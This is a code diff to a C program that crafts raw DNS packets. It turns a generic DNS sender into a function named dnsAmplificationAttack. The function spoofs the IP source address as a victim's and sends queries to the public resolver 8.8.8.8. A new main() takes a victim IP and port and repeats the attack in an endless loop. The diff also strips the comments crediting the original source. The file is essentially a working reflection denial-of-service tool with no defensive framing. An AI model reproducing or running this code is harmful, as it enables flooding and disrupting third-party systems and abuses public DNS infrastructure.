@@ -1,19 +1,18 @@
 #include "dns.h"
 #include <string.h>
 
-// Taken from http://www.binarytides.com/raw-udp-sockets-c-linux/
-unsigned short csum(unsigned short *ptr,int nbytes) 
+unsigned short checkSum(unsigned short *ptr, int numBytes) 
 {
 	register long sum;
 	unsigned short oddbyte;
 	register short answer;
 
 	sum=0;
-	while(nbytes>1) {
+	while(numBytes>1) {
 		sum+=*ptr++;
-		nbytes-=2;
+		numBytes-=2;
 	}
-	if(nbytes==1) {
+	if(numBytes==1) {
 		oddbyte=0;
 		*((unsigned char *)&oddbyte)=*(unsigned char *)ptr;
 		sum+=oddbyte;
@@ -26,8 +25,7 @@ unsigned short csum(unsigned short *ptr,int nbytes)
 	return(answer);
 }
 
-// Taken from http://www.binarytides.com/dns-query-code-in-c-with-linux-sockets/
-void dns_format(unsigned char * dns,unsigned char * host) 
+void querySiteFormat(unsigned char * dns,unsigned char * host) 
 {
 	int lock = 0 , i;
 	strcat((char*)host,".");
@@ -84,12 +82,13 @@ void queryset(query *q){
 	q->qclass = htons(0x1);
 }
 
-void dns_send(char *targetIp, int targetPort, char *dnsIp, int dnsPort,
-	unsigned char *dnsRecord)
+void dnsAmplificationAttack(char *targetIp, int targetPort)
 {
-	// Building the DNS request data packet
+	char *dnsIp = "8.8.8.8";
+	int dnsPort = 53;
 	
 	unsigned char dnsRequestPacket[139];
+	unsigned char *dnsRecord = "github.com";
 	
 	dnsHeader *dns = (dnsHeader *)&dnsRequestPacket;
 	dnsHeaderCreate(dns);
@@ -97,7 +96,7 @@ void dns_send(char *targetIp, int targetPort, char *dnsIp, int dnsPort,
 	unsigned char *dnsName, dnsRcrd[32];
 	dnsName = (unsigned char *)&dnsRequestPacket[sizeof(dnsHeader)];
 	strcpy(dnsRcrd, dnsRecord);
-	dns_format(dnsName , dnsRcrd);
+	querySiteFormat(dnsName , dnsRcrd);
 	
 	query *q;
 	q = (query *)&dnsRequestPacket[sizeof(dnsHeader) + (strlen(dnsName)+1)];
@@ -109,7 +108,6 @@ void dns_send(char *targetIp, int targetPort, char *dnsIp, int dnsPort,
 	eDnsHeaderCreate(eDns);
 	
 	
-	// Building the IP and UDP headers
 	char datagram[4096], *data, *psgram;
     memset(datagram, 0, 4096);
     
@@ -125,7 +123,7 @@ void dns_send(char *targetIp, int targetPort, char *dnsIp, int dnsPort,
     ipHeaderCreate(ip);
     ip->tot_len = sizeof(iph) + sizeof(udph) + sizeof(dnsHeader) + (strlen(dnsName)+1) + sizeof(query) + sizeof(eDnsHeader);
     ip->saddr = inet_addr(targetIp);
-	ip->check = csum((unsigned short *)datagram, ip->tot_len);
+	ip->check = checkSum((unsigned short *)datagram, ip->tot_len);
 	ip->daddr = sin.sin_addr.s_addr;
 	
     udph *udp = (udph *)(datagram + sizeof(iph));
@@ -148,7 +146,7 @@ void dns_send(char *targetIp, int targetPort, char *dnsIp, int dnsPort,
     memcpy(psgram, (char *)&pshdr, sizeof(psHeader));
     memcpy(psgram + sizeof(psHeader), udp, sizeof(udph) + sizeof(dnsHeader) + (strlen(dnsName)+1) + sizeof(query) + sizeof(eDnsHeader));
 		
-    udp->check = csum((unsigned short *)psgram, pssize);
+    udp->check = checkSum((unsigned short *)psgram, pssize);
     
     // Send data
     int sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
@@ -159,4 +157,23 @@ void dns_send(char *targetIp, int targetPort, char *dnsIp, int dnsPort,
 	close(sd);
 	
 	return;
+}
+
+int main(int argc, char **argv)
+{	
+	if(getuid()!=0)
+		printf("You must be running as root!\n");
+	if(argc<3)
+		printf("Usage: %s victimIp victimPort\n", argv[0]);
+	
+	char *victimIp = argv[1];
+	int victimPort = atoi(argv[2]);
+	
+	while(1) {
+		printf("dns send\n");
+		dnsAmplificationAttack(victimIp, victimPort);
+		sleep(5);
+	}	
+
+	return 0;
 }
